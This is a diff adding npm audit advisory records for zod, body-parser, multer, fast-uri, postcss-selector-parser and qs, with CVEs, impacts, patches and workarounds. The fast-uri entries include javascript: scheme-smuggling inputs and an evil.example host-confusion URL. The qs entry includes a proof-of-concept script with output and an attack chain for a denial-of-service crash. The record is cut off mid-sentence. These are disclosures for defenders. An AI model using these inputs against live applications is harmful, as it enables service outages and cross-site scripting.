+      "created": "2026-10-01T18:32:46.000Z",
+      "id": 1243066,
+      "npm_advisory_id": null,
+      "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+      "reported_by": null,
+      "title": "Zod can exhaust memory while validating oversized constrained collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-54404"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "zod",
+      "vulnerable_versions": "<4.6.6",
+      "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+      "recommendation": "Upgrade to version 4.6.6 or later",
+      "patched_versions": ">=4.6.6",
+      "updated": "2026-10-23T18:26:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+    },
+    "1243074": {
+      "findings": [
+        {
+          "version": "2.3.0",
+          "paths": [
+            "artifacts__api-server>express>body-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-27r3-jxmh-p828\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111181\n- https://github.com/expressjs/body-parser/commit/1260c3845f54502a05a87594f09a334786bb34d7\n- https://github.com/expressjs/body-parser/commit/f7075eae3a84c3473ab4bf0a777da28db208e916\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/body-parser/releases/tag/1.20.9\n- https://github.com/expressjs/body-parser/releases/tag/v2.4.0\n- https://github.com/advisories/GHSA-27r3-jxmh-p828",
+      "created": "2026-10-23T20:53:11.000Z",
+      "id": 1243074,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA single request can crash any application using `body-parser` with default options. When a request carries a `Content-Encoding` (for example `gzip`), `body-parser` pipes it into a decompression stream and, after reading the body, leaves that stream piped with no error listener. A payload of one valid compressed frame followed by trailing bytes decodes and the application responds normally, but the trailing bytes then reach the already-finished decoder, which emits an error that is re-thrown as an uncaught exception and terminates the process. No authentication or matching route is required, since parsing runs before routing.\n\n### Patches\n\nFixed in body-parser 2.4.0 and 1.20.9. Upgrade to one of these versions.\n\n### Workarounds\n\nPass `inflate: false` to the body-parser middleware if the application does not need to accept compressed request bodies. This rejects encoded requests before any decompression stream is created.",
+      "reported_by": null,
+      "title": "body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111181"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "body-parser",
+      "vulnerable_versions": ">=2.0.0 <2.4.0",
+      "github_advisory_id": "GHSA-27r3-jxmh-p828",
+      "recommendation": "Upgrade to version 2.4.0 or later",
+      "patched_versions": ">=2.4.0",
+      "updated": "2026-10-23T20:53:12.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-27r3-jxmh-p828"
+    },
+    "1243083": {
+      "findings": [
+        {
+          "version": "2.3.0",
+          "paths": [
+            "artifacts__api-server>multer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-q7qp-rjg7-q26m\n- https://nvd.nist.gov/vuln/detail/CVE-2026-113872\n- https://github.com/expressjs/multer/commit/80a2d9df1dfd63b5fab631b8b9966164ed647adf\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.5.0\n- https://github.com/advisories/GHSA-q7qp-rjg7-q26m",
+      "created": "2026-10-23T22:08:22.000Z",
+      "id": 1243083,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen `multer` is configured with an asynchronous `fileFilter`, a single request can crash the Node.js process. If a request is aborted (for example when one file is rejected) while another file's async `fileFilter` is still pending, the pending callback later resumes a parsing stream that multer has already torn down. busboy then emits an error on a stream that no longer has an error listener, which Node raises as an unhandled `'error'` event, and the process exits. A single unauthenticated request is enough, so any application using `multer` with an asynchronous `fileFilter` is affected, regardless of storage engine. Uploads using a synchronous `fileFilter` are not affected.\n\n### Patches\n\nUsers should upgrade to `multer` `2.5.0` or later.\n\n### Workarounds\n\nUse a synchronous `fileFilter`.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via a pending asynchronous fileFilter after request teardown",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-113872"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": ">=2.0.0 <2.5.0",
+      "github_advisory_id": "GHSA-q7qp-rjg7-q26m",
+      "recommendation": "Upgrade to version 2.5.0 or later",
+      "patched_versions": ">=2.5.0",
+      "updated": "2026-10-23T22:08:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-404"
+      ],
+      "url": "https://github.com/advisories/GHSA-q7qp-rjg7-q26m"
+    },
+    "1243097": {
+      "findings": [
+        {
+          "version": "4.1.3",
+          "paths": [
+            "lib__api-spec>orval>@scalar/openapi-parser>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-w74x-v6f9-j3xg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110306\n- https://github.com/fastify/fast-uri/commit/39933a1f1422986f14e2d844f552238feb40f5d4\n- https://github.com/fastify/fast-uri/commit/597f254c86d151568511eeb9a1df761fd12520b3\n- https://github.com/fastify/fast-uri/commit/e60e716f41d1d73717e2d803d20b68d2c6d20a0f\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-w74x-v6f9-j3xg",
+      "created": "2026-10-23T21:41:36.000Z",
+      "id": 1243097,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` percent-decodes the scheme component with the legacy global `unescape()` before validating it, so an input whose decoded scheme is a valid but dangerous token is emitted as a live scheme. RFC 3986 section 3.1 does not allow percent-encoding in a scheme, so no RFC or WHATWG parser treats such input as having that scheme, but `fast-uri` does.\n\nFor example, `normalize('%6Aavascript:alert(1)')` returns `javascript:alert(1)`, `resolve('https://a.example/', '%6Aavascript:alert(1)')` returns `javascript:alert(1)`, and `parse('%6Aavascript:alert(1)').scheme` returns `javascript`. The `%uXXXX` form (`%u006Aavascript:`) produces the same result, and `equal('%68ttp://a/', 'http://a/')` returns `true`.\n\nAn application that screens dangerous schemes on the raw input and then stores or renders `normalize(input)` or `resolve(base, input)` turns an inert string into an executable `javascript:`, `data:`, or `vbscript:` URL, a stored or reflected cross-site scripting vector in the consuming application. `equal()` also treats an encoded and a plain scheme as the same, which can bypass equality-based allowlists.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nReject input whose scheme part (before the first `:`, and before any `/`, `?`, or `#`) contains `%`. Alternatively, check `parse(x).scheme` against an allowlist after normalization and use that same parsed result rather than the raw string.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to URI scheme spoofing via percent-encoded scheme decoding",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110306"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.0.0 <4.2.3",
+      "github_advisory_id": "GHSA-w74x-v6f9-j3xg",
+      "recommendation": "Upgrade to version 4.2.3 or later",
+      "patched_versions": ">=4.2.3",
+      "updated": "2026-10-23T21:41:38.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-172",
+        "CWE-180"
+      ],
+      "url": "https://github.com/advisories/GHSA-w74x-v6f9-j3xg"
+    },
+    "1243100": {
+      "findings": [
+        {
+          "version": "4.1.3",
+          "paths": [
+            "lib__api-spec>orval>@scalar/openapi-parser>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-xhq7-xmqj-769h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110095\n- https://github.com/fastify/fast-uri/commit/048bbd0a252971be86d6579f0dfc87f8de5b9c47\n- https://github.com/fastify/fast-uri/commit/52774a5c35df36b0bbe439cd4c12c3dc0e50e3b9\n- https://github.com/fastify/fast-uri/commit/7c19f8b97ec51f1f20b4e3d9d5820cb8d5176058\n- https://github.com/fastify/fast-uri/commit/9eb8759a9825c046f57f7f695f1944bc39b88abd\n- https://github.com/fastify/fast-uri/commit/acc5c5d60c4209571789496e1732468911c7e12a\n- https://github.com/fastify/fast-uri/commit/b110a3571c37dfcf9d1c72ce2e2e178c78d1a424\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-xhq7-xmqj-769h",
+      "created": "2026-10-23T21:39:34.000Z",
+      "id": 1243100,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `normalize()` and `serialize()` apply RFC 3986 dot-segment removal (`remove_dot_segments`) to the path of a relative-path reference. RFC 3986 section 5.2.4 defines that algorithm only for the merged target path during resolution, not for the reference itself, so applied to the reference it drops leading `..` segments and can turn a document-relative reference into a root-relative one.\n\nFor example, `normalize('a/../b')` returns `/b` and `normalize('../x')` returns `x`, so `resolve(base, normalize(ref))` points at a different resource than `resolve(base, ref)`, and `equal()` treats distinct references as the same.\n\nApplications that normalize attacker-supplied or user-supplied relative references and then resolve them, or use them as cache, deduplication, or authorization keys, can have a reference escape its intended directory and point at a different resource.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nDo not normalize a relative reference before resolving it. Resolve it against the absolute base first, then normalize the absolute result.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to improper path equivalence in relative reference normalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110095"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.0.0 <4.2.3",
+      "github_advisory_id": "GHSA-xhq7-xmqj-769h",
+      "recommendation": "Upgrade to version 4.2.3 or later",
+      "patched_versions": ">=4.2.3",
+      "updated": "2026-10-23T21:39:38.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-41"
+      ],
+      "url": "https://github.com/advisories/GHSA-xhq7-xmqj-769h"
+    },
+    "1243103": {
+      "findings": [
+        {
+          "version": "4.1.3",
+          "paths": [
+            "lib__api-spec>orval>@scalar/openapi-parser>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-wjr9-j795-jxcr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110180\n- https://github.com/fastify/fast-uri/commit/58c183d0b168ad87f98773266444ce1f6375803a\n- https://github.com/fastify/fast-uri/commit/ddfc6a51122dfce0365655f04479fc3adb7f6b3c\n- https://github.com/fastify/fast-uri/commit/f6d46dfeab025d0c440485f4ae29fa4f14707646\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-wjr9-j795-jxcr",
+      "created": "2026-10-23T21:37:59.000Z",
+      "id": 1243103,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` versions `>= 2.4.2, <= 2.4.7`, `>= 3.1.3, <= 3.1.8`, and `>= 4.0.1, <= 4.2.2` can silently rewrite the host of an HTTP-family URL (`http`, `https`, `ws`, `wss`, or any scheme with `domainHost: true`). For those schemes `canonicalizeHost()` passes the parsed host to the WHATWG `URL` parser and adopts its `.hostname` without checking that the parser read the whole input as a host. RFC 3986 permits `@` inside the host group and the WHATWG parser strips TAB, LF, and CR, so the authority `fast-uri` reports is rewritten by that second parser with no `error` set: data before an `@` is dropped and whitespace is removed.\n\nFor example, `fast-uri` parses `http://a@b@evil.example/` to host `evil.example` (dropping the `b` segment), and a host containing a raw TAB, CR, or LF has those characters stripped. `equal()` then treats a whitespace-smuggled host as the same as the clean one, and `resolve()` rewrites the authority the same way.\n\nApplications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) on one representation, such as the raw input, see a policy/use desync: the canonical host `fast-uri` returns differs from what was checked, and traffic can be steered to an unintended destination.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nReject URIs whose authority contains more than one `@`, or contains TAB, CR, or LF, before calling `fast-uri`. Alternatively, treat any non-empty `parse(x).error` as fatal, and compare hosts only from the same `parse()` result.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via unchecked WHATWG host canonicalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110180"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.0.1 <4.2.3",
+      "github_advisory_id": "GHSA-wjr9-j795-jxcr",
+      "recommendation": "Upgrade to version 4.2.3 or later",
+      "patched_versions": ">=4.2.3",
+      "updated": "2026-10-23T21:38:02.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-wjr9-j795-jxcr"
+    },
+    "1243106": {
+      "findings": [
+        {
+          "version": "4.1.3",
+          "paths": [
+            "lib__api-spec>orval>@scalar/openapi-parser>ajv>fast-uri"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-333x-w4r6-6crp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110725\n- https://github.com/fastify/fast-uri/commit/39e6493c1356f30a0084171627eb266786e1620e\n- https://github.com/fastify/fast-uri/commit/a9b8d67353630aab053cd727cf629023dd018d2b\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-333x-w4r6-6crp",
+      "created": "2026-10-23T21:36:40.000Z",
+      "id": 1243106,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `serialize()`, `normalize()`, and `resolve()`, when called with the non-default option `reference: 'suffix'` on a reference that has no authority, emit a relative reference whose first path segment contains a bare colon without escaping it. RFC 3986 section 3.3 requires the first segment of a `path-noscheme` reference not to contain a colon, precisely because a bare colon makes the string reparse as an absolute URI with a scheme. `fast-uri`'s default serialization escapes that colon, but the suffix path does not.\n\nFor example, `normalize('javascript:alert(1)', { reference: 'suffix' })` returns `javascript:alert(1)`, which reparses as a live `javascript:` scheme; `data:` and `vbscript:` behave the same.\n\nApplications that serialize or normalize a relative reference with `reference: 'suffix'` and then treat the result as a URI can turn inert input into a live `javascript:`, `data:`, or `vbscript:` URL (a cross-site scripting vector), and `equal()` can conflate a scheme-bearing reference with a relative one. Exposure is limited to applications that use the non-default `reference: 'suffix'` option.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nDo not use the `reference: 'suffix'` option on untrusted input. If suffix output is required, percent-encode a colon in the first path segment of the result before treating it as a URI.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to scheme injection via an unescaped first-segment colon in suffix references",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110725"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=4.0.0 <4.2.3",
+      "github_advisory_id": "GHSA-333x-w4r6-6crp",
+      "recommendation": "Upgrade to version 4.2.3 or later",
+      "patched_versions": ">=4.2.3",
+      "updated": "2026-10-23T21:36:41.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-41",
+        "CWE-116"
+      ],
+      "url": "https://github.com/advisories/GHSA-333x-w4r6-6crp"
+    },
+    "1243379": {
+      "findings": [
+        {
+          "version": "6.0.10",
+          "paths": [
+            "artifacts__dashboard-ui>@tailwindcss/typography>postcss-selector-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss-selector-parser/security/advisories/GHSA-rj75-hqrm-r3gf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104844\n- https://github.com/postcss/postcss-selector-parser/commit/62b191792df0a0bc56062e5a875bc74aae2a51cd\n- https://github.com/postcss/postcss-selector-parser/releases/tag/7.1.6\n- https://github.com/postcss/postcss-selector-parser/pull/346\n- https://github.com/postcss/postcss-selector-parser/commit/70b0779c843462197380d25daa02d1528bf7eae5\n- https://github.com/postcss/postcss-selector-parser/releases/tag/6.1.5\n- https://github.com/advisories/GHSA-rj75-hqrm-r3gf",
+      "created": "2026-10-05T22:53:54.000Z",
+      "id": 1243379,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`.` and `#` are not word delimiters in the tokenizer, so a flat selector such as\n`.a.a.a...` reaches `splitWord()` as a single word token carrying n class or id\nindexes. Three passes scanned those index arrays linearly for every index,\nmaking the parse O(n^2) in the number of indexes rather than in input length:\n`uniqs()`, the `indices.forEach` loop, and the Sass-interpolation filter.\nParsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a\nsingle thread. A benign selector of identical byte size parses in tens of\nmilliseconds, so the cost is driven by the index count, not the input size.\nThe nesting depth of such a selector is 0, so the `maxNestingDepth` guard added\nin 7.1.3 offers no protection.\n\nReachability is deployment dependent. Only consumers that parse untrusted,\nattacker-supplied selectors synchronously in a request path are exposed, for\nexample CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary\nbuild-time use on trusted sources is not affected.\n\n### Patches\n\nFixed in 7.1.6. The three passes now use Set membership tests, making parsing\nlinear in the number of indexes. There is no behaviour change: parsing is\nbyte-identical on a differential corpus of 8413 selectors.\n\n### Workarounds\n\nCap the size of selectors accepted from untrusted sources before parsing.",
+      "reported_by": null,
+      "title": "PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104844"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss-selector-parser",
+      "vulnerable_versions": "<6.1.5",
+      "github_advisory_id": "GHSA-rj75-hqrm-r3gf",
+      "recommendation": "Upgrade to version 6.1.5 or later",
+      "patched_versions": ">=6.1.5",
+      "updated": "2026-10-26T14:07:57.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-rj75-hqrm-r3gf"
+    },
+    "1243687": {
+      "findings": [
+        {
+          "version": "6.16.0",
+          "paths": [
+            "artifacts__api-server>express>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-6pq8-jhm2-2vcw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110816\n- https://github.com/ljharb/qs/commit/a952e7519338ef0cfb25694a2988848f93333727\n- https://github.com/ljharb/qs/releases/tag/v6.16.1\n- https://github.com/advisories/GHSA-6pq8-jhm2-2vcw",
+      "created": "2026-10-27T16:10:55.000Z",
+      "id": 1243687,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.\n\n## Root Cause\n\nWhen `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `\"string\"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.\n\n```text\nlib/stringify.js  (comma-array branch)\n  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path\n  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path\nlib/utils.js\n  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path\n```\n\n## Impact\n\nPrerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.\n\n## Proof of Concept\n\n`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`\n\n```js\nvar qs = require('qs');\n\n// Source A: qs.parse with allowPrototypes retains the hostile toString segment\nqs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });\n\n// Source B: a JSON request body, no qs parse option needed\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma' });\n\n// Also affected: the encodeValuesOnly sub-path\nqs.stringify(JSON.parse('{\"a\":[{\"toString\":\"x\"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });\n```\n\n```text\nA default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value\nB default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value\nC encodeValuesOnly path => THREW: TypeError: Cannot convert object to primitive value\nN2 callable toString => NO THROW; output=\"a=z\"\nN3 isBuffer vector (CVE-2026-82417) => NO THROW; output=\"a%5Bconstructor%5D%5BisBuffer%5D=x\"\nqs version: 6.16.0\n```\n\n## Attack Chain\n\n1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.\n2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: <non-callable value> } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{\"a\":[{\"toString\":\"x\"}]}`.\n3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.\n4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path skips that closure entirely and reaches `obj.join(',')` at `lib/stringify.js:156` with no guard at all.\n5. **Primitive:** The element is coerced to a string (`Array.prototype.join`, or `String(str)` at `lib/utils.js:292`). `ToPrimitive` skips the non-callable own `toString`, `valueOf` returns the object, and a `TypeError` is thrown.\n6. **Result:** The uncaught synchronous exception propagates out of the serialization call, failing the request and, in a service without a synchronous error boundary, crashing the process (denial of service).\n\n## Bypass Evidence\n\nThis is a different element type on the code path CVE-2026-8723 (GHSA-q8mj-m7cp-5q26) patched, plus the default comma path, which that fix never covered. CVE-2026-8723 addressed a `TypeError` crash on `null`/`undefined` entries in the comma plus `encodeValuesOnly` path. Its fix (commit 21f80b3) wraps the encoder in `function (v) { return v == null ? v : encoder(v); }`, so it only passes `null` and `undefined` through. A non-null element with a hostile own `toString` fails the `v == null` test, so the encoder still runs and still throws; the encodeValuesOnly case (case C above) throws on the exact fixed code. The default comma path (`encodeValuesOnly` unset, the library default) never entered that fix at all: `git log -S \"obj.join(','\" -- lib/stringify.js` shows no security fix has ever touched the `obj.join(',')` line, and cases A and B throw with `encodeValuesOnly` unset. The related isBuffer hardening for CVE-2026-82417 (commit e83d321) is a different sink at the `lib/stringify.js:134` guard, which is never entered for the array element; the negative control `{a:{constructor:{isBuffer:'x'}}}` serializes cleanly. Disproof attempts that failed: a `valueOf`-only object does not throw (it serializes to `[object Object]`), confirming the trigger is an element with no callable `toString` (an own non-callable `toString`, or a null-prototype object with no `toString` at all, as `qs.parse` produces under `plainObjects`); nested arrays (`{\"a\":[[{\"toString\":\"x\"}]]}`) throw the same way; a callable `toString` serializes cleanly; and the default (non-comma) array format serializes cleanly, confirming the comma format is required. All positive and negative cases were reproduced on the exact published 6.16.0 artifact.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: qs`\n- `Confirmed affected range: >= 6.7.0, <= 6.16.0`\n- `Latest release checked: 6.16.0 (npm latest; git tag v6.16.0)`\n- `Fix status: fixed in 6.16.1 (a952e75)`\n\nThe `arrayFormat: 'comma'` join sink was introduced in qs 6.7.0, so 6.7.0 is the lower boundary; releases before 6.7.0 lack the sink. No released version fixes this vector, and the latest published release (6.16.0) reproduces the throw, so the closed upper bound `<= 6.16.0` covers every affected release. The `encodeValuesOnly` sub-path was added later, but the default comma-join vector already affects 6.7.0, so 6.7.0 governs the lower boundary.\n\n## Suggested Fix\n\nThe comma array serialization must not allow an implicit string coercion of an array element to throw an uncaught exception. Coercion of each comma element should be performed defensively (for example by wrapping the join and per-element encode so that a coercion failure is caught and handled), and this protection must cover both the default `obj.join(',')` path and the `encodeValuesOnly` encoder path, not only the previously patched `null`/`undefined` case. As an interim mitigation without a code change, applications can avoid `arrayFormat: 'comma'` when serializing data derived from untrusted input, sanitize parsed objects (avoid `allowPrototypes`/`plainObjects` on untrusted input and strip unexpected own properties), or wrap `qs.stringify` calls in a synchronous error boundary so a coercion failure cannot crash the process.\n\nReported by zx (GitHub: @manus-pi).\n\n---\n\n## Independent report by @Lucidsec\n\nThe following was reported separately, after this advisory, and is merged here as a duplicate.\n\n### Summary\n\nIn project [qs](https://github.com/ljharb/qs), in versions `>= 6.7.0, <= 6.16.0` (every version that supports `arrayFormat: 'comma'`), `qs.stringify` with `arrayFormat: 'comma'` can throw an uncaught `TypeError: Cannot convert object to primitive value` when an array element has a non-callable own `toString`. It is fixed in 6.16.1. Related: CWE-248 and CWE-704.\n\n### Technical Details\n\n`qs.stringify` with `arrayFormat: 'comma'` joins an array at `lib/stringify.js:156` via `obj.join(',')`. An element whose own `toString` is not callable makes `Array.prototype.join` throw. There is no type check and no catch on that path.\n\nA second path exists with `encodeValuesOnly`: at `lib/stringify.js:151-154`, `maybeMap` only skips `v == null`, then `lib/utils.js:292` does `String(str)` and throws the same `TypeError` (this second site exists since v6.11.1; before that, the same input throws at `join`).\n\nWho can trigger: someone who can shape an array element passed to `stringify`. The host must use non-default `arrayFormat: 'comma'`. Default `arrayFormat` `indices` does not fold arrays and is not affected. A parse-then-stringify path also needs `plainObjects: true` (null-prototype elements from `lib/parse.js:200`) or `allowPrototypes: true` (which Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set). Default `qs.parse('a[0][toString]=x')` returns `{}` because the prototype guard drops `toString`. Direct JSON handed to `stringify` can supply `{\"a\":[{\"toString\":\"x\"}]}`.\n\nCause: the comma fold at `lib/stringify.js:149-156` collapses the array into a single value before the main loop at `lib/stringify.js:172-212`, so `skipNulls` and `strictNullHandling` only ever see the joined value, never individual elements. `isNonNullishPrimitive` / `isBuffer` at `lib/stringify.js:134` inspect the whole value, not each element. A normal object uses `Object.prototype.toString` and becomes `[object Object]`. An own non-callable `toString` is skipped, `valueOf` returns the object, and `join` throws. (The skipped TODO test at `test/stringify.js:684-689` uses a plain `{ b: 